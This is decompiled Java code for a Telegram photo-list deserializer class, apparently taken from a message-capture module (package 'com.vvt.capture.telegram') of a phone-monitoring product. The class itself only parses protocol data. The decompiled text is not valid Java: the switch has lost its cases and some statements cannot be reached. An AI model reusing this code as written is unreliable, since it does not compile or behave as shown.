package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$photos_Photos
  extends TLObject
{
  public int count;
  public ArrayList photos;
  public ArrayList users;
  
  public TLRPC$photos_Photos()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.photos = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.users = localArrayList;
  }
  
  public static photos_Photos TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in photos_Photos", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_photos_photos;
      ((TLRPC.TL_photos_photos)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_photos_photosSlice;
      ((TLRPC.TL_photos_photosSlice)localObject).<init>();
    }
    if (localObject != null) {
      ((photos_Photos)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (photos_Photos)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$photos_Photos.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */